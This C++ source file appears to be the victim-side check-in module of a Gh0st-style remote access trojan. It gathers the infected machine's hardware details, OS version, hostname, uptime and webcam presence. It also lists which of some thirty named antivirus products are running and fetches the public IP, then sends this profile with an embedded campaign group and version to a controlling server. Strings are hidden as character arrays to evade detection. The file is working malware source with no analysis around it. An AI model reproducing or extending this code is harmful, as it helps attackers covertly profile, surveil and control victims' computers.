#include "../stdafx.h"
#include "until.h"

#include <iphlpapi.h> //网络速率头
/*************判断视频的头文件*******************/
#include <strmif.h>
#include <uuids.h>
#include <wininet.h>
#include "decode.h"
#pragma comment(lib, "strmiids.lib")
#pragma comment(lib,"Iphlpapi.lib")
/**********************************/
extern TCHAR strRemark[32];     //版本
extern TCHAR UpGroup[50];       //分组
extern TCHAR szGetGroup[256];  //分组唯一标识
// Get System Information
DWORD CPUClockMhzT()
{
	char str1[256]="~M";
	char str2[256]="Hz";
	strcat(str1,str2);

	char xYKTm[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0'};
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, xYKTm, 0, KEY_QUERY_VALUE, &hKey);
	RegQueryValueEx(hKey, str1, NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

//枚举视频设备
//////////////////////////////////////////////////////////
UINT EnumDevices()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM 库初始化
	/////////////////////    Step1        /////////////////////////////////
	//枚举捕获设备
	ICreateDevEnum *pCreateDevEnum;                          //创建设备枚举器
	//创建设备枚举管理器
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //要创建的Filter的Class ID
		NULL,                                                //表示Filter不被聚合
		CLSCTX_INPROC_SERVER,                                //创建进程内COM对象
		IID_ICreateDevEnum,                                  //获得的接口ID
		(void**)&pCreateDevEnum);                            //创建的接口对象的指针
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //枚举监控器接口
	//获取视频类的枚举器
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//如果想获取音频类的枚举器，则使用如下代码
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //类型枚举器复位
	ULONG cFetched;
	IMoniker *pM;                                            //监控器接口指针
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //获取下一个设备
	{
		IPropertyBag *pBag;                                  //属性页接口指针
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//获取设备属性页
		if(SUCCEEDED(hr)) 
		{
            VARIANT var;
            var.vt = VT_BSTR;                                //保存的是二进制数据
            hr = pBag->Read(L"FriendlyName", &var, NULL);
			//获取FriendlyName形式的信息
            if (hr == NOERROR) 
            {
				nCam++;
				SysFreeString(var.bstrVal);   //释放资源，特别要注意
            }
            pBag->Release();                  //释放属性页接口指针
        }
        pM->Release();                        //释放监控器接口指针
    }
	CoUninitialize();                   //卸载COM库
	return nCam;
}
//////////////////////////////////////////////////////////

bool IsWebCam()
{
	bool	bRet = false;

	if (EnumDevices()>0)
	{
        bRet = TRUE;
	}
	return bRet;
}

BOOL GetOSVerIs64Bit() //获取系统平台
{
	BOOL bRet=FALSE;
	SYSTEM_INFO si;
	typedef VOID(__stdcall*GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
	GETNATIVESYSTEMINFO fnGetNativeSystemInfo;
    char yGyioJf[] = {'G','e','t','N','a','t','i','v','e','S','y','s','t','e','m','I','n','f','o','\0'};
	fnGetNativeSystemInfo=(GETNATIVESYSTEMINFO)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")),yGyioJf);
	if (fnGetNativeSystemInfo!=NULL)
	{
		fnGetNativeSystemInfo(&si);
		if(si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64 )
		{
			bRet=TRUE;
		}
	}
	return bRet;
}

int GetNetwork()//获取网络速率Mbps 
{
        DWORD dwSize = 0;
        DWORD dwRetVal = 0;
        DWORD speed = 0; 
        DWORD dwspeed = 0;
        MIB_IFTABLE *pIfTable;
        MIB_IFROW *pIfRow;       
        
        pIfTable = (MIB_IFTABLE *) malloc(sizeof (MIB_IFTABLE));
        if (pIfTable == NULL) 
        {
                return 1;
        }
        dwSize = sizeof (MIB_IFTABLE);
        if (GetIfTable(pIfTable, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) 
        {
                free( pIfTable);
                pIfTable = (MIB_IFTABLE *) malloc(dwSize);
                if (pIfTable == NULL) 
                {
                        return 1;
                }
        }

        if ((dwRetVal = GetIfTable(pIfTable, &dwSize, FALSE)) == NO_ERROR) 
        {        
                pIfRow = (MIB_IFROW *) & pIfTable->table[0];
                speed = pIfRow->dwSpeed;
                dwspeed = speed/1000/1000; //mbps        
        } 
        if (pIfTable != NULL) 
        {
                free(pIfTable);
                pIfTable = NULL;
        }
        
        return dwspeed;
}

/////////////////杀毒显示//////////////////////////////////
typedef struct
{
	char *Course;
	char *Name;
}AYSDFE;

AYSDFE g_Ayadfe_Datas[40] =
{
	{"360tray.exe",       "360安全卫士"},
	{"360sd.exe",         "360杀毒"},
	{"kxetray.exe",       "金山毒霸"},
	{"KSafeTray.exe",     "金山安全卫士"},
	{"QQPCRTP.exe",       "QQ电脑管家"},
	{"HipsTray.exe",      "火绒"},
	{"BaiduSd.exe",       "百度杀毒"},
	{"baiduSafeTray.exe", "百度卫士"},
	{"KvMonXP.exe",       "江民"},
	{"RavMonD.exe",       "瑞星"},
	{"QUHLPSVC.EXE",      "QuickHeal"},   //印度
	{"mssecess.exe",      "微软MSE"},
	{"cfp.exe",           "Comodo杀毒"},
	{"SPIDer.exe",        "DR.WEB"},      //大蜘蛛
	{"acs.exe",           "Outpost"},
	{"V3Svc.exe",         "安博士V3"},
	{"AYAgent.aye",       "韩国胶囊"},
	{"avgwdsvc.exe",      "AVG"},
	{"f-secure.exe",      "F-Secure"},    //芬安全
	{"avp.exe",           "卡巴"},
	{"Mcshield.exe",      "麦咖啡"},
	{"egui.exe",          "NOD32"},
	{"knsdtray.exe",      "可牛"},
	{"TMBMSRV.exe",       "趋势"},
	{"avcenter.exe",      "小红伞"},
	{"ashDisp.exe",       "Avast网络安全"}, 
	{"rtvscan.exe",       "诺顿"}, 
	{"remupd.exe",        "熊猫卫士"},
	{"vsserv.exe",        "BitDefender"}, //BD  bdagent.exe
	{"PSafeSysTray.exe",  "PSafe反病毒"}, //巴西
	{"ad-watch.exe",      "Ad-watch反间谍"}, 
	{"K7TSecurity.exe",   "K7杀毒"}, 
	{"UnThreat.exe",      "UnThreat"},    //保加利亚
	{"  ",                "  "}
};

char* GetVirus()
{
	static char AllName[1024];
	int t = 0;
	memset(AllName, 0, sizeof(AllName));
	while(1)
	{
		if (strstr(g_Ayadfe_Datas[t].Course, " " )  == 0)
		{
			if (GetProcessID(g_Ayadfe_Datas[t].Course))
			{
				lstrcat(AllName, g_Ayadfe_Datas[t].Name);
				lstrcat(AllName, " " );
			}
		}
		else
			break;
		t++;
	}
	
	if (strstr(AllName, " " )  == 0)
	{
		lstrcat(AllName , "无 ");
	}
	
	return AllName;
}

void ReadRegExg(LPCTSTR lpServiceName ,LPTSTR lpSame ,LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024]={0};
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
//	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	char JYvni08[] = {'S','Y','S','T','E','M','\\','S','e','l','e','c','t','\0'};
 	wsprintf(strSubKey, JYvni08,lpServiceName);
    ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,lpSame, REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
}

UINT GetHostRemark(LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024] = "SYSTEM\\Setup";
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
	
	return lstrlen(lpBuffer);
}


char* GetInfo(LPCTSTR lpKeyName, LPCTSTR lpServiceName)
{
	char	strValue[1024]={0};
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	
	if(!ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, lpKeyName, REG_SZ, (char *)strValue, NULL, 1024, 0))
 		return "";
	return	strValue;
}

UINT GetGroupName(LPTSTR lpBuffer, UINT uSize)
{	
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	
	wsprintf(strSubKey,"%s%s%s%s", "SYST", "EM\\CurrentContro", "lSet\\Services\\", "BITS");
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, szGetGroup , REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	return lstrlen(lpBuffer);
}

UINT GetMarkTime(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char JYvni04[] = {'M','a','r','k','T','i','m','e','\0'};
	ReadRegExg(lpServiceName ,JYvni04 ,lpBuffer, uSize);
	if (lstrlen(lpBuffer) == 0)
	{
		strcpy(lpBuffer,"无信息");
	}
	return lstrlen(lpBuffer);
}

BOOL GetNtVersionNumbers(DWORD& dwMajorVer, DWORD& dwMinorVer,DWORD& dwBuildNumber)
{
    BOOL bRet= FALSE;
    HMODULE hModNtdll= NULL;
    if (hModNtdll= ::LoadLibraryW(L"ntdll.dll"))
    {
        typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*, DWORD*, DWORD*);
        pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
        pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
        if (pfRtlGetNtVersionNumbers)
        {
			pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer, &dwBuildNumber);
			dwBuildNumber &= 0x0ffff;
			bRet = TRUE;
        }
		
        ::FreeLibrary(hModNtdll);
        hModNtdll = NULL;
    }
	
    return bRet;
}

BOOL GetWanIPAddress(IN_ADDR *WanIPAddress)
{
	char szUrl[] = {'h','t','t','p',':','/','/','w','w','w','.','t','a','o','b','a','o','.','c','o','m','/','h','e','l','p','/','g','e','t','i','p','.','p','h','p','\0'};
	HINTERNET hInternet;
	HINTERNET hHttpFile;
	char *szHttpBuffer;
	DWORD dwHttpBufferLen;
	DWORD dwBytesRead;
	char *ip_start;
	char *ip_stop;
	
	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return FALSE;
	hHttpFile = InternetOpenUrl(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD, NULL);
	if (hHttpFile == NULL)
	{
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	if (!InternetQueryDataAvailable(hHttpFile, &dwHttpBufferLen, 0, 0))
	{
		InternetCloseHandle(hHttpFile);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	szHttpBuffer = new char[dwHttpBufferLen+1];
	memset(szHttpBuffer, 0, dwHttpBufferLen+1);
	if (!InternetReadFile(hHttpFile, szHttpBuffer, dwHttpBufferLen, &dwBytesRead))
	{
		delete[] szHttpBuffer;
		InternetCloseHandle(hHttpFile);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	InternetCloseHandle(hHttpFile);
	InternetCloseHandle(hInternet);
	ip_start = strchr(szHttpBuffer, '\"');
	ip_stop = strrchr(szHttpBuffer, '\"');
	if (ip_start!=NULL && ip_stop!=NULL)
	{
		ip_start++;
		*ip_stop = '\0';
		ULONG Addr = inet_addr(ip_start);
		delete[] szHttpBuffer;
		if (Addr != INADDR_NONE)
		{
			WanIPAddress->S_un.S_addr = Addr;
			return TRUE;
		}
	}
	delete[] szHttpBuffer;
	return FALSE;
}

int sendLoginInfo(CClientSocket *pClient, DWORD dwSpeed, LPSTR szVersion)
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	memset(&LoginInfo,0,sizeof(LoginInfo));
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0;        // 没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	GetNtVersionNumbers(LoginInfo.OsVerInfoEx.dwMajorVersion,LoginInfo.OsVerInfoEx.dwMinorVersion,LoginInfo.OsVerInfoEx.dwBuildNumber);
	
	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));

	// 主机名
	char hostname[256];
	GetHostRemark(hostname, sizeof(hostname));
	memcpy(&LoginInfo.HostName, hostname, sizeof(hostname));
	// CPU
	LoginInfo.dwCPUClockMhz = CPUClockMhzT();
	SYSTEM_INFO SysInfo; // 用于获取CPU个数的
	GetSystemInfo(&SysInfo);
	LoginInfo.nCPUNumber = SysInfo.dwNumberOfProcessors;
	
	// 内存大小
    MEMORYSTATUSEX	MemInfo; // 用GlobalMemoryStatusEx可显示2G以上内存
    MemInfo.dwLength=sizeof(MemInfo); 
    GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
	LoginInfo.MemSize = (unsigned long)strMem;

	// 硬盘空间
	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
	unsigned long nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[10];//, strPrint[128];
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = (unsigned long)(nAllGB + nTotalBytes.QuadPart/1024/1024);
//		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;  //剩余磁盘
    }
	// 硬盘
	LoginInfo.DriverSize = nAllGB;

	// 摄像头
	LoginInfo.bIsWebCam = IsWebCam();
	
	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	// 网卡
	LoginInfo.Speed = GetNetwork();
		
	// 服务安装时间
	GetMarkTime(/*SerName*/NULL, LoginInfo.MarkTime, sizeof(LoginInfo.MarkTime));

	// 32 or 64
	LoginInfo.bIs64 = GetOSVerIs64Bit();

	// 杀毒软件
    strcpy( LoginInfo.Virus, GetVirus() );

	// 活动时间
	char jsbHj10[] = {'%','d','\0'};
	DWORD t=GetTickCount();
	char day[100];
	char hour[100];
	char min[100];
	wsprintfA(day, jsbHj10, t/86400000);
	t%=86400000;
	wsprintfA(hour,jsbHj10, t/3600000);
	t%=3600000;
	wsprintfA(min, jsbHj10, t/60000);
	wsprintfA(LoginInfo.RunTime, "%s天%s时%s分", day, hour,min);
	
	// 上线版本
	char *szVerTemp = GeneratorDecode(strRemark);
	strcpy(LoginInfo.szVersion, szVerTemp);
	free(szVerTemp);

	// 上线分组
	char *UpRow = NULL;
	bool bFree = false;
	char Group[256];
	char strWirn2[] = {'D','e','f','a','u','l','t','\0'};
	if(GetGroupName(Group, sizeof(Group))==0)
	{
		if(UpGroup != NULL)
		{
			UpRow = (char *)(GeneratorDecode(UpGroup));
			bFree = true;
		}
		else
		{
			UpRow = strWirn2;
		}
	}
	else
	{
		UpRow=Group;
	}
	strcpy(LoginInfo.UpGroup,UpRow);
	if (bFree) free(UpRow);

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));
	return nRet;
}
